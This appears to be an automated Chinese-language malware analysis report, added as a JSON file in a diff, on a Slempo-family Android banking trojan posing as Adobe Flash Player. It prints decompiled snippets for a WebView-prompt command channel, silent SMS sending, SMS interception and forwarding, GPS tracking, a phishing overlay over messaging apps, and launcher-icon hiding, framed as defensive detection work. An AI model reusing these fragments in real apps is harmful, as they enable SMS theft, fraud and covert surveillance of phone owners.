@@ -1,0 +1,193 @@
+{
+  "APK信息": {
+    "文件名": "e072a7a8d8e5a562342121408493937ecdedf6f357b1687e6da257f40d0c6b27.apk",
+    "sha256": "e072a7a8d8e5a562342121408493937ecdedf6f357b1687e6da257f40d0c6b27",
+    "包名": "org.slempo.service",
+    "应用名": "Adobe Flash Player",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 255.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\slempo\\service\\CommonHTMLChromeClient;",
+          "method_signature": "onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {\n    result.confirm(CommonHTML.webAppInterface.textToCommand(message, defaultValue));\n    return true;\n}",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class CommonHTMLChromeClient extends WebChromeClient {\n      @Override // android.webkit.WebChromeClient\n>>>     public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {\n>>>         result.confirm(CommonHTML.webAppInterface.textToCommand(message, defaultValue));\n>>>         return true;\n>>>     }\n  }",
+          "behavior_description": "该代码重写WebChromeClient.onJsPrompt，将WebView中JavaScript通过window.prompt()传入的message和defaultValue参数转发给textToCommand方法进行命令解析与执行，并将执行结果通过result.confirm()返回给JavaScript。这是一种典型的C2隐蔽通信通道：C2服务器通过WebView加载的网页中的JavaScript代码向原生层发送指令，原生层解析并执行命令后将结果回传，实现远程控制。该模式属于Slempo恶意软件家族的标志性C2通信机制，JavaScript prompt充当命令传输载体，textToCommand充当命令分发器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\slempo\\service\\utils\\Utils;",
+          "method_signature": "if(parts.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!number.equals(\"\")) { SmsManager sms = SmsManager.getDefault(); ArrayList<String> parts = sms.divideMessage(text); if (parts.size() > 1) { sms.sendMultipartTextMessage(number, null, parts, null, null); } else { sms.sendTextMessage(number, null, text, null, null); } }",
+          "malicious_code_snippet_context": "if (!number.equals(\"\")) { SmsManager sms = SmsManager.getDefault(); ArrayList<String> parts = sms.divideMessage(text); if (parts.size() > 1) { sms.sendMultipartTextMessage(number, null, parts, null, null); } else { sms.sendTextMessage(number, null, text, null, null); } }",
+          "behavior_description": "该方法接收外部传入的手机号和短信内容，使用 SmsManager 静默发送短信，无用户确认即可发送，可能造成用户资费消耗或用于短信欺诈。数据流向为：外部传入的 number/text → SmsManager.sendTextMessage()/sendMultipartTextMessage()。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\slempo\\service\\MessageReceiver;",
+          "method_signature": "if(processor.processCommand()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Map<String, String> messages = retrieveMessages(intent);\nfor (String sender : messages.keySet()) {\n    SmsProcessor processor = new SmsProcessor(messages.get(sender), \"\", context);\n    if (processor.processCommand()) {\n        abortBroadcast();\n    } else {\n        boolean needToInterceptIncoming = processor.needToInterceptIncoming();\n        if (needToInterceptIncoming || blockedNumbers.contains(sender)) {\n            Sender.sendInterceptedIncomingSMS(context, messages.get(sender), sender);\n            abortBroadcast();\n        } else if (needToListenIncoming) {\n            Sender.sendListenedIncomingSMS(context, messages.get(sender), sender);\n        }\n    }\n}",
+          "malicious_code_snippet_context": "          } catch (Exception e) {\n              e.printStackTrace();\n          }\n>>>         Map<String, String> messages = retrieveMessages(intent);\n>>>         for (String sender : messages.keySet()) {\n>>>             SmsProcessor processor = new SmsProcessor(messages.get(sender), \"\", context);\n>>>             if (processor.processCommand()) {\n>>>                 abortBroadcast();\n>>>             } else {\n>>>                 boolean needToInterceptIncoming = processor.needToInterceptIncoming();\n>>>                 boolean needToListenIncoming = processor.needToListen();\n>>>                 if (needToInterceptIncoming || blockedNumbers.contains(sender)) {\n>>>                     Sender.sendInterceptedIncomingSMS(context, messages.get(sender), sender);\n>>>                     abortBroadcast();\n>>>                 } else if (needToListenIncoming) {\n>>>                     Sender.sendListenedIncomingSMS(context, messages.get(sender), sender);\n>>>                 }\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该代码在SMS广播接收器中拦截 incoming SMS。通过 retrieveMessages(intent) 获取短信内容，经 SmsProcessor 判断后调用 abortBroadcast() 终止广播传递，使短信无法到达用户收件箱。同时通过 Sender.sendInterceptedIncomingSMS() 将拦截的短信内容及发送方号码上传至远程服务器，实现短信窃取与拦截。这是银行木马典型手法，用于拦截验证码和银行通知短信，配合 blockedNumbers 黑名单和远程指令控制拦截策略。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\slempo\\service\\MainService;",
+          "method_signature": "getLocation()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "locationManager = (LocationManager) getSystemService(\"location\");\nlocationManager.requestLocationUpdates(\"gps\", 0L, 0.0f, this);\nreturn locationManager.getLastKnownLocation(\"gps\");",
+          "malicious_code_snippet_context": "      }\n  \n      private void initLocation() {\n>>>         locationManager = (LocationManager) getSystemService(\"location\");\n>>>         locationManager.requestLocationUpdates(\"gps\", 0L, 0.0f, this);\n>>>     }\n  \n      public static Location getLocation() {\n          return locationManager.getLastKnownLocation(\"gps\");",
+          "behavior_description": "代码在恶意服务中通过LocationManager注册了GPS位置更新监听，并通过getLastKnownLocation获取设备当前GPS位置信息，属于位置追踪和隐私窃取行为。数据来源为getLastKnownLocation(\"gps\")，危险操作为在恶意服务中持续追踪并获取用户位置数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "com.whatsapp"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\slempo\\service\\MainService;",
+          "method_signature": "if((MainService.this.isRunning(\"com.whatsapp\")",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if ((MainService.this.isRunning(\"com.whatsapp\") || MainService.this.isRunning(\"com.viber.voip\") || MainService.this.isRunning(\"com.instagram.android\") || MainService.this.isRunning(\"com.skype.raider\")) && !MainService.settings.getBoolean(Constants.PHONE_IS_SENT, false)) { Intent i2 = new Intent(MainService.this, (Class<?>) ChangeNumber.class); i2.addFlags(268435456); i2.addFlags(131072); MainService.this.startActivity(i2); }",
+          "malicious_code_snippet_context": "                          MainService.this.startActivity(i);\n                          return;\n                      }\n>>>                     if ((MainService.this.isRunning(\"com.whatsapp\") || MainService.this.isRunning(\"com.viber.voip\") || MainService.this.isRunning(\"com.instagram.android\") || MainService.this.isRunning(\"com.skype.raider\")) && !MainService.settings.getBoolean(Constants.PHONE_IS_SENT, false)) {\n                          Intent i2 = new Intent(MainService.this, (Class<?>) ChangeNumber.class);\n                          i2.addFlags(268435456);\n                          i2.addFlags(131072);",
+          "behavior_description": "恶意服务持续监控前台运行的应用程序，当检测到用户正在使用 WhatsApp、Viber、Instagram 或 Skype 等社交应用时，立即启动 ChangeNumber 钓鱼 Activity 并叠加在社交应用之上（FLAG_ACTIVITY_NEW_TASK），通过伪造的界面诱导用户输入手机号码等敏感信息，用于社交蠕虫传播或账号劫持。每次触发后通过 PHONE_IS_SENT 标志位避免重复弹出。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\slempo\\service\\Main;",
+          "method_signature": "if(Constants.APP_MODE.equals(Constants.APP_MODE)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Constants.APP_MODE.equals(Constants.APP_MODE) || Constants.APP_MODE.equals(Constants.CLIENT_NUMBER)) {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n    finish();\n}",
+          "malicious_code_snippet_context": "              i.setClass(this, MainService.class);\n              startService(i);\n          }\n>>>         if (Constants.APP_MODE.equals(Constants.APP_MODE) || Constants.APP_MODE.equals(Constants.CLIENT_NUMBER)) {\n>>>             PackageManager packageManager = getPackageManager();\n>>>             ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>             packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>             finish();\n>>>             return;\n          }\n          if (Constants.APP_MODE.equals(\"2\")) {\n              setContentView(R.layout.main_activity);",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将 Main Activity 组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从启动器中隐藏。条件 Constants.APP_MODE.equals(Constants.APP_MODE) 恒为 true，确保图标隐藏逻辑无条件执行。此外代码还检测设备所在国家，非俄罗斯时启动后台 MainService，表明该恶意软件具有地域针对性。数据流向：Constants.APP_MODE（配置常量）→ setComponentEnabledSetting()（隐藏图标）。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
